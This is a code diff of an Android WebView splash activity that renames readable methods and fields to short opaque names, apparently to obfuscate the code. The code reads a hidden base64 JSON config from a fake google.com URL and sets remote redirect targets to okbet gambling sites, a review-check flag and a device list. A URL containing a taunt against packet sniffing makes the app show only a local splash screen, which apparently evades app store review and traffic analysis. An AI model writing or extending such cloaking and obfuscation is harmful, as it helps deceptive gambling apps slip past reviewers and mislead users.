+        long saveTime = getTime(d4);
 
         logger("nowtime " + nowTime);
         logger("saveTime " + saveTime);
 
         if (saveTime == 0) {
-            saveTime(context, System.currentTimeMillis());
+            saveTime(d4, System.currentTimeMillis());
             return false;
         } else if (nowTime - saveTime > 24 * 60 * 60 * 1000) {
             logger("已经是超过一天的老用户");
@@ -770,7 +865,7 @@ public class FBSplashActivity extends Activity {
      *
      * @return the manufacturer of the product/hardware
      */
-    public static String getManufacturer() {
+    public static String gmf() {
         String manufacturer = Build.MANUFACTURER;
         if (null == manufacturer) {
             manufacturer = "";
@@ -785,7 +880,7 @@ public class FBSplashActivity extends Activity {
      *
      * @return the model of device
      */
-    public static String getModel() {
+    public static String gM() {
         String model = Build.MODEL;
         if (model != null) {
             model = model.trim().replaceAll("\\s*", "");
@@ -799,20 +894,20 @@ public class FBSplashActivity extends Activity {
     /**
      * Android 5.0以下版本的文件选择回调
      */
-    public static ValueCallback<Uri> mFileUploadCallbackFirst;
+    public static ValueCallback<Uri> fucf;
     /**
      * Android 5.0及以上版本的文件选择回调
      */
-    public static ValueCallback<Uri[]> mFileUploadCallbackSecond;
+    public static ValueCallback<Uri[]> fubs;
     public static final int REQUEST_CODE_FILE_PICKER = 51426;
-    protected String mUploadableFileTypes = "image/*";
+    protected String uft = "image/*";
 
 
     public class Wcc extends WebChromeClient {
 
         @Override
         public void onProgressChanged(WebView view, int newProgress) {
-            setProgressBar(newProgress);
+            spb(newProgress);
         }
 
 
@@ -856,16 +951,16 @@ public class FBSplashActivity extends Activity {
         protected void openFileInput(final ValueCallback<Uri> fileUploadCallbackFirst, final ValueCallback<Uri[]> fileUploadCallbackSecond,
                                      final boolean allowMultiple) {
             //Android 5.0以下版本
-            if (mFileUploadCallbackFirst != null) {
-                mFileUploadCallbackFirst.onReceiveValue(null);
+            if (fucf != null) {
+                fucf.onReceiveValue(null);
             }
-            mFileUploadCallbackFirst = fileUploadCallbackFirst;
+            fucf = fileUploadCallbackFirst;
 
             //Android 5.0及以上版本
-            if (mFileUploadCallbackSecond != null) {
-                mFileUploadCallbackSecond.onReceiveValue(null);
+            if (fubs != null) {
+                fubs.onReceiveValue(null);
             }
-            mFileUploadCallbackSecond = fileUploadCallbackSecond;
+            fubs = fileUploadCallbackSecond;
 
             Intent i = new Intent(Intent.ACTION_GET_CONTENT);
             i.addCategory(Intent.CATEGORY_OPENABLE);
@@ -875,7 +970,7 @@ public class FBSplashActivity extends Activity {
                     i.putExtra(Intent.EXTRA_ALLOW_MULTIPLE, true);
                 }
             }
-            i.setType(mUploadableFileTypes);
+            i.setType(uft);
 
             startActivityForResult(Intent.createChooser(i, "选择文件"), REQUEST_CODE_FILE_PICKER);
         }
@@ -885,9 +980,9 @@ public class FBSplashActivity extends Activity {
          *
          * @param progress
          */
-        private void setProgressBar(int progress) {
+        private void spb(int progress) {
             ProgressBar mProgressBar;
-            mProgressBar = mj_progressBar;
+            mProgressBar = c;
             if (mProgressBar == null) return;
             logger("progress " + progress);
             if (progress == 100) {
@@ -910,10 +1005,10 @@ public class FBSplashActivity extends Activity {
             if (resultCode == Activity.RESULT_OK) {
                 if (intent != null) {
                     //Android 5.0以下版本
-                    if (mFileUploadCallbackFirst != null) {
-                        mFileUploadCallbackFirst.onReceiveValue(intent.getData());
-                        mFileUploadCallbackFirst = null;
-                    } else if (mFileUploadCallbackSecond != null) {//Android 5.0及以上版本
+                    if (fucf != null) {
+                        fucf.onReceiveValue(intent.getData());
+                        fucf = null;
+                    } else if (fubs != null) {//Android 5.0及以上版本
                         Uri[] dataUris = null;
 
                         try {
@@ -934,27 +1029,27 @@ public class FBSplashActivity extends Activity {
                             }
                         } catch (Exception ignored) {
                         }
-                        mFileUploadCallbackSecond.onReceiveValue(dataUris);
-                        mFileUploadCallbackSecond = null;
+                        fubs.onReceiveValue(dataUris);
+                        fubs = null;
                     }
                 }
             } else {
                 //这里mFileUploadCallbackFirst跟mFileUploadCallbackSecond在不同系统版本下分别持有了
                 //WebView对象，在用户取消文件选择器的情况下，需给onReceiveValue传null返回值
                 //否则WebView在未收到返回值的情况下，无法进行任何操作，文件选择器会失效
-                if (mFileUploadCallbackFirst != null) {
-                    mFileUploadCallbackFirst.onReceiveValue(null);
-                    mFileUploadCallbackFirst = null;
-                } else if (mFileUploadCallbackSecond != null) {
-                    mFileUploadCallbackSecond.onReceiveValue(null);
-                    mFileUploadCallbackSecond = null;
+                if (fucf != null) {
+                    fucf.onReceiveValue(null);
+                    fucf = null;
+                } else if (fubs != null) {
+                    fubs.onReceiveValue(null);
+                    fubs = null;
                 }
             }
         }
     }
 
 
-    public class WebClient extends WebViewClient {
+    public class Wcl extends WebViewClient {
         @Override // android.webkit.WebViewClient
         public final void onLoadResource(WebView webView, String str) {
             super.onLoadResource(webView, str);
@@ -964,14 +1059,14 @@ public class FBSplashActivity extends Activity {
         public void onPageStarted(WebView view, String url, Bitmap favicon) {
             super.onPageStarted(view, url, favicon);
             logger("onPageStarted " + url);
-            if (url.contains(WebData.webDataCenter.hfgwxz_001) && !TextUtils.isEmpty(WebData.webDataCenter.hfgwxz_001)) {
-                jumpBrpw(url);
+            if (url.contains(WD.WD_CENTER.hfgwxz_001) && !TextUtils.isEmpty(WD.WD_CENTER.hfgwxz_001)) {
+                jB(url);
             }
-            if (url.contains(WebData.webDataCenter.cvcvczk_002) && !TextUtils.isEmpty(WebData.webDataCenter.cvcvczk_002)) {
-                jumpBrpw(url);
+            if (url.contains(WD.WD_CENTER.cvcvczk_002) && !TextUtils.isEmpty(WD.WD_CENTER.cvcvczk_002)) {
+                jB(url);
             }
-            if (url.contains(WebData.webDataCenter.erfcxht_003) && !TextUtils.isEmpty(WebData.webDataCenter.erfcxht_003)) {
-                jumpBrpw(url);
+            if (url.contains(WD.WD_CENTER.erfcxht_003) && !TextUtils.isEmpty(WD.WD_CENTER.erfcxht_003)) {
+                jB(url);
             }
         }
 
@@ -999,45 +1094,45 @@ public class FBSplashActivity extends Activity {
 
                 logger("shouldOverrideUrlLoading " + str);
 
-                if (str.contains(WebData.webDataCenter.hfgwxz_001) && !TextUtils.isEmpty(WebData.webDataCenter.hfgwxz_001)) {
-                    jumpBrpw(str);
+                if (str.contains(WD.WD_CENTER.hfgwxz_001) && !TextUtils.isEmpty(WD.WD_CENTER.hfgwxz_001)) {
+                    jB(str);
                     return true;
                 }
-                if (str.contains(WebData.webDataCenter.cvcvczk_002) && !TextUtils.isEmpty(WebData.webDataCenter.cvcvczk_002)) {
-                    jumpBrpw(str);
+                if (str.contains(WD.WD_CENTER.cvcvczk_002) && !TextUtils.isEmpty(WD.WD_CENTER.cvcvczk_002)) {
+                    jB(str);
                     return true;
                 }
-                if (str.contains(WebData.webDataCenter.erfcxht_003) && !TextUtils.isEmpty(WebData.webDataCenter.erfcxht_003)) {
-                    jumpBrpw(str);
+                if (str.contains(WD.WD_CENTER.erfcxht_003) && !TextUtils.isEmpty(WD.WD_CENTER.erfcxht_003)) {
+                    jB(str);
                     return true;
                 }
-                if (WebData.webDataCenter.jjssArrays != null && WebData.webDataCenter.jjssArrays.size() > 0) {
-                    logger("jjssArrays " + WebData.webDataCenter.jjssArrays.get(0));
+                if (WD.WD_CENTER.jjssArrays != null && WD.WD_CENTER.jjssArrays.size() > 0) {
+                    logger("jjssArrays " + WD.WD_CENTER.jjssArrays.get(0));
                     boolean isInClude = false;
-                    for (String s : WebData.webDataCenter.jjssArrays) {
+                    for (String s : WD.WD_CENTER.jjssArrays) {
                         if (str.contains(s)) {
                             isInClude = true;
                         }
                     }
                     if (isInClude) {
-                        jumpBrpw(str);
+                        jB(str);
                         return true;
                     }
                 }
 
                 if (str.contains("//t.me/")) {
-                    jumpBrpw(str);
+                    jB(str);
                     return true;
                 }
 
                 if (str.contains("cnm-bie-zhua-bao")) {
-                    jumpLocalSplash();
+                    jLS();
                     return true;
                 }
 
-                if(str.contains("http://google.com/jsonokbet")){
+                if (str.contains("http://google.com/jsonokbet")) {
                     String jsonBase64 = str.replace("http://google.com/jsonokbet"
-                            ,"");
+                            , "");
                     byte[] decode = Base64.decode(jsonBase64, Base64.DEFAULT);
                     String decodeStr = new String(decode);
                     String json = decodeStr;
@@ -1047,8 +1142,8 @@ public class FBSplashActivity extends Activity {
                             .replace("\t", "");
                     JSONObject jSONObject = new JSONObject(replace);
 
-                    if(jSONObject.has( "hf")){
-                        WebData.webDataCenter.hf_001 = jSONObject.getString( "hf");
+                    if (jSONObject.has("hf")) {
+                        WD.WD_CENTER.hf_001 = jSONObject.getString("hf");
                         //test   https://okbet-v2.cxsport.net/mobile
                         //http://okbet.life/app_cfg_win_ok/OkbettingWinV1/index.html
                         //  WebData.dataCenter.hf_001 = " https://webview.vipsroom.net/?inviteCode=2277 ";
@@ -1059,57 +1154,57 @@ public class FBSplashActivity extends Activity {
                         //    WebData.dataCenter.hf_001 = "cnm-bie-zhua-bao";
                     }
 
-                    if(jSONObject.has("jump_001")){
-                        WebData.webDataCenter.hfgwxz_001 = jSONObject.getString("jump_001");
+                    if (jSONObject.has("jump_001")) {
+                        WD.WD_CENTER.hfgwxz_001 = jSONObject.getString("jump_001");
                     }
 
-                    if(jSONObject.has("jump_002")){
-                        WebData.webDataCenter.cvcvczk_002 = jSONObject.getString("jump_002");
+                    if (jSONObject.has("jump_002")) {
+                        WD.WD_CENTER.cvcvczk_002 = jSONObject.getString("jump_002");
                     }
 
-                    if(jSONObject.has("jump_003")){
-                        WebData.webDataCenter.erfcxht_003 = jSONObject.getString("jump_003");
+                    if (jSONObject.has("jump_003")) {
+                        WD.WD_CENTER.erfcxht_003 = jSONObject.getString("jump_003");
                     }
 
-                    if(jSONObject.has("aipi")){
-                        WebData.webDataCenter.ai3p6i9 = jSONObject.getString("aipi");
+                    if (jSONObject.has("aipi")) {
+                        WD.WD_CENTER.ai3p6i9 = jSONObject.getString("aipi");
                     }
 
-                    if(jSONObject.has("hfRea")){
-                        WebData.webDataCenter.hf_rea = jSONObject.getString("hfRea");
+                    if (jSONObject.has("hfRea")) {
+                        WD.WD_CENTER.hf_rea = jSONObject.getString("hfRea");
                     }
 
-                    if(jSONObject.has("icChecking")){
-                        WebData.webDataCenter.isCcccheck = jSONObject.getBoolean("icChecking");
+                    if (jSONObject.has("icChecking")) {
+                        WD.WD_CENTER.isCcccheck = jSONObject.getBoolean("icChecking");
                     }
 
-                    if(jSONObject.has("isJump")){
-                        WebData.webDataCenter.isJump0117 = jSONObject.getBoolean("isJump");
+                    if (jSONObject.has("isJump")) {
+                        WD.WD_CENTER.isJump0117 = jSONObject.getBoolean("isJump");
                     }
 
 
-                    if(jSONObject.has("jump_array")){
-                        WebData.webDataCenter.jjssArrays.clear();
+                    if (jSONObject.has("jump_array")) {
+                        WD.WD_CENTER.jjssArrays.clear();
                         JSONArray jsonArray = jSONObject.getJSONArray("jump_array");
                         for (int i = 0; i < jsonArray.length(); i++) {
-                            WebData.webDataCenter.jjssArrays.add((String) jsonArray.get(i));
+                            WD.WD_CENTER.jjssArrays.add((String) jsonArray.get(i));
                         }
                     }
 
-                    if(jSONObject.has("dev_array")){
-                        WebData.webDataCenter.deArray.clear();
+                    if (jSONObject.has("dev_array")) {
+                        WD.WD_CENTER.deArray.clear();
                         JSONArray jsonArray = jSONObject.getJSONArray("dev_array");
                         for (int i = 0; i < jsonArray.length(); i++) {
-                            WebData.webDataCenter.deArray.add((String) jsonArray.get(i));
+                            WD.WD_CENTER.deArray.add((String) jsonArray.get(i));
                         }
                     }
 
-                    mainHandle.sendMsg(000,"");
+                    a.sendMsg(000, "");
 
                     return true;
                 }
 
-                    loadUu(str);
+                lu(str);
 
             } catch (Exception unused) {
             }
@@ -1118,41 +1213,41 @@ public class FBSplashActivity extends Activity {
     }
 
 
-    public static int getLayoutId(Context paramContext, String paramString) {
+    public static int gli(Context paramContext, String paramString) {
         return paramContext.getResources().getIdentifier(paramString, "layout",
                 paramContext.getPackageName());
     }
 
-    public static int getStringId(Context paramContext, String paramString) {
+    public static int gsi(Context paramContext, String paramString) {
         return paramContext.getResources().getIdentifier(paramString, "string",
                 paramContext.getPackageName());
     }
 
-    public static int getDrawableId(Context paramContext, String paramString) {
+    public static int gdi(Context paramContext, String paramString) {
         return paramContext.getResources().getIdentifier(paramString,
                 "drawable", paramContext.getPackageName());
     }
 
-    public static int getMipmapId(Context paramContext, String paramString) {
+    public static int gmip(Context paramContext, String paramString) {
         return paramContext.getResources().getIdentifier(paramString,
                 "mipmap", paramContext.getPackageName());
     }
 
-    public static int getStyleId(Context paramContext, String paramString) {
+    public static int gssiop(Context paramContext, String paramString) {
         return paramContext.getResources().getIdentifier(paramString,
                 "style", paramContext.getPackageName());
     }
 
-    public static int getId(Context paramContext, String paramString) {
+    public static int ggi(Context paramContext, String paramString) {
         return paramContext.getResources().getIdentifier(paramString, "id", paramContext.getPackageName());
     }
 
-    public static int getColorId(Context paramContext, String paramString) {
+    public static int gcii(Context paramContext, String paramString) {
         return paramContext.getResources().getIdentifier(paramString,
                 "color", paramContext.getPackageName());
     }
 
-    public static int getArrayId(Context paramContext, String paramString) {
+    public static int gai(Context paramContext, String paramString) {
         return paramContext.getResources().getIdentifier(paramString,
                 "array", paramContext.getPackageName());
     }
